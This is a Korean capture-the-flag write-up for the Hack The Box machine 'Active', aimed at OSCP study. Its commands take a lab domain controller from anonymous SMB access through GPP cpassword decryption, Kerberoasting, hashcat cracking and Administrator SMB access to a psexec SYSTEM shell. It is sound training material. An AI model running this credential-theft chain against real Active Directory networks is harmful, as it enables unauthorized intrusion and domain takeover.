# Active (HTB) - Write-up (2026 Edition)

**난이도** : Easy  
**OS** : Windows Server 2008 R2 (Domain Controller)  
**Release Date** : 28 Jul 2018  
**Retire Date** : 04 May 2024

**핵심 공격 경로**

- **익명 SMB 열거** → `Replication` 공유(READ) 발견
    
- 공유에서 **GPP Groups.xml** 발견 → `cpassword` **복호화** → `SVC_TGS` 자격증명 획득
    
- 도메인 계정으로 **Kerberoasting(GetUserSPNs)** → `Administrator` TGS 해시 획득 & 크랙
    
- `Administrator` 패스워드로 SMB(C$) 접근해 root.txt 획득 (쉘 없이도 가능)
    
- 선택: `impacket-psexec`로 **SYSTEM 쉘**
    

> **OSCP 대비 팁**  
> AD/DC 박스는 **SMB(445) → SYSVOL/Replication → GPP(cpassword)** 루트가 “진짜 자주” 나옴.  
> Kerberoasting은 “서비스 SPN이 걸린 계정”이 있고 비번이 약하면 바로 DA로 간다.  
> 이 박스는 **쉘 없이도** 플래그 획득 가능한 점이 포인트(공유 접근/권한이 곧 RCE급).

---

## 환경 정보 요약

- IP : `10.10.10.100` (당시 기준)
    
- 열린 포트(대표): 53(DNS), 88(Kerberos), 389(LDAP), 445(SMB), 3268(GC LDAP), 47001(HTTPAPI), 다수 RPC
    
- 주요 테크닉 : **SMB Anonymous Share → GPP Decrypt → Kerberoast → Admin creds → SMB / PSExec**
    

**보충 설명** : DC의 전형 포트 셋(53/88/389/445/3268/고포트 RPC)로 식별 가능. SMB 서명(required) 같은 옵션은 “중간자”를 막지만 이 공격 체인에는 큰 영향이 없음.

---

## 0. 준비

### 0-1. hosts 등록

sudo sh -c 'echo "10.10.10.100 active.htb dc.active.htb" >> /etc/hosts'

---

## 1. Reconnaissance (정찰)

### 1-1. 전체 포트 스캔 (TCP)

sudo nmap -sS -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.100

### 1-2. 스크립트 + 버전 스캔

sudo nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001 -oA nmap/scripts 10.10.10.100

**결과 요약 (관찰 포인트)**

- **LDAP 결과에 Domain**이 보이면 거의 DC 확정
    
- Kerberos(88), LDAP(389/3268), SMB(445), RPC(135) 조합이면 AD 환경
    

---

## 2. Enumeration (열거)

## 2-1. SMB 공유 열거 (Anonymous)

### 옵션 A: smbmap (깔끔하게 권한까지 보여줌)

smbmap -H 10.10.10.100

**기대 결과**

- `Replication` 공유가 **READ ONLY**로 열려있음 (익명)
    

### 옵션 B: smbclient로 공유 목록

smbclient -N -L //10.10.10.100

**보충 설명** : “익명으로 읽을 수 있는 공유”는 AD에서 SYSVOL/Replication 관련 misconfig의 단골. 이 박스는 여기서 바로 터짐.

---

## 3. Replication Share 탐색 & GPP 발견

### 3-1. smbclient로 Replication 접속 (익명)

smbclient //10.10.10.100/Replication -N

탐색 팁(중요 경로):

- `active.htb\Policies\{GUID}\MACHINE\Preferences\Groups\Groups.xml`
    

예시로 파일 찾기:

cd active.htb  
cd Policies  
recurse ON  
prompt OFF  
ls

또는 **빠르게 파일 찾기(권장)** — smbclient에서 `recurse` 후 경로 따라가며 `ls`로 확인.

**보충 설명** : GPP는 주로 SYSVOL 쪽이 정석인데, 이 박스는 Replication 공유로도 노출되어 있음.

---

## 4. GPP cpassword 복호화 → 도메인 계정 획득

### 4-1. Groups.xml 다운로드

smbclient 안에서:

get Groups.xml

### 4-2. cpassword 추출 (로컬)

grep -oP 'cpassword="\K[^"]+' Groups.xml  
grep -oP 'userName="\K[^"]+' Groups.xml

예상 관찰:

- `userName="active.htb\SVC_TGS"`
    
- `cpassword="...."`
    

### 4-3. gpp-decrypt로 복호화

gpp-decrypt '<CPASSWORD값>'

**결과**

- `SVC_TGS` 계정의 평문 비밀번호 획득
    

> **보충 설명**  
> GPP의 cpassword는 “암호화”처럼 보이지만 키가 공개되어 있어 사실상 평문 저장이었음.  
> 패치 이후 “새로 저장”은 막혔지만, **레거시로 남아있는** 경우가 현실에서 매우 흔함.

---

## 5. 인증된 SMB 접근 (계정 검증 + user flag)

### 5-1. smbmap로 권한 확인

smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p '<복호화된비번>'

**기대 결과**

- `Users`, `SYSVOL`, `NETLOGON` 등이 READ로 열림
    

### 5-2. Users 공유 접속 → user.txt 획득

smbclient //10.10.10.100/Users -U 'active.htb\SVC_TGS%<비번>'

경로:

- `SVC_TGS\Desktop\user.txt`
    

smbclient에서:

cd SVC_TGS\Desktop  
get user.txt

---

## 6. Kerberoasting (GetUserSPNs → TGS 해시 크랙)

### 6-1. SPN 계정 + TGS 해시 요청 (2026 Impacket)

> 설치된 impacket 버전에 따라 `GetUserSPNs.py` 대신 `impacket-GetUserSPNs`가 일반적임.

impacket-GetUserSPNs active.htb/SVC_TGS:'<비번>' -dc-ip 10.10.10.100 -request -outputfile kerberoast.txt

**기대 결과**

- `Administrator` 또는 다른 서비스 계정에 대한 `$krb5tgs$23$...` 해시가 `kerberoast.txt`에 저장됨
    

**보충 설명** : Kerberoast는 “서비스 티켓이 서비스 계정의 NTLM 기반으로 암호화”되는 점을 이용해 오프라인 크랙을 하는 공격. 계정 패스워드가 약하면 DA까지 바로 뚫림.

---

## 7. Hash Cracking (hashcat)

### 7-1. hashcat 모드 확인

이 박스 스타일의 TGS 해시는 보통:

- **13100 (Kerberos 5, TGS-REP, etype 23)**
    

hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force

크랙 성공 시:

- `Administrator:<PASSWORD>` 획득
    

> **보충 설명**  
> OSCP 환경에선 rockyou로 바로 뚫리는 경우가 많아서, Kerberoast는 “무조건 시도”급.

---

## 8. Administrator 권한으로 Root Flag 획득 (쉘 없이 가능)

### 8-1. 관리자 SMB 권한 확인

smbmap -H 10.10.10.100 -d active.htb -u Administrator -p '<크랙된비번>'

기대: `C$` 접근 가능 (READ/WRITE)

### 8-2. C$로 root.txt 다운로드

smbclient //10.10.10.100/C$ -U 'active.htb\Administrator%<비번>'

경로:

- `\Users\Administrator\Desktop\root.txt`
    

get \Users\Administrator\Desktop\root.txt

✅ **중요 포인트:** 이 박스는 여기까지가 사실상 “root”이며, 쉘이 없어도 완료됨.

---

## 9. (선택) SYSTEM Shell 획득 (PSExec)

impacket-psexec active.htb/Administrator:'<비번>'@10.10.10.100

접속 후 확인:

whoami

기대:

- `nt authority\system`
    

**보충 설명** : PSExec 류는 관리자 권한 + ADMIN$/C$ 쓰기 가능할 때 서비스 생성/실행으로 SYSTEM 쉘을 만든다. 실제 환경에선 탐지될 수 있으니(EDR) 조심.

---

## Attack Chain 한 줄 요약

**Anonymous SMB → Replication(READ) → Groups.xml(cpassword) → gpp-decrypt → SVC_TGS creds → Kerberoast(Admin TGS) → hashcat → Administrator creds → SMB(C$)로 root.txt → (옵션) psexec SYSTEM**

---

## Beyond (OSCP 스타일 체크리스트)

-  DC 포트 셋(53/88/389/445/3268/135) 보이면 **AD 루트로 사고**
    
-  SMB: `smbmap -H` / `smbclient -N -L`로 **익명 공유**부터 확인
    
-  SYSVOL/Replication에서 `Groups.xml`, `Services.xml`, `Scheduledtasks.xml` 같은 **GPP 흔적** 탐색
    
-  도메인 계정 얻으면 바로 `impacket-GetUserSPNs -request`로 **Kerberoast**
    
-  Admin creds면: 쉘 없어도 SMB로 플래그 가능(권한이 곧 접근)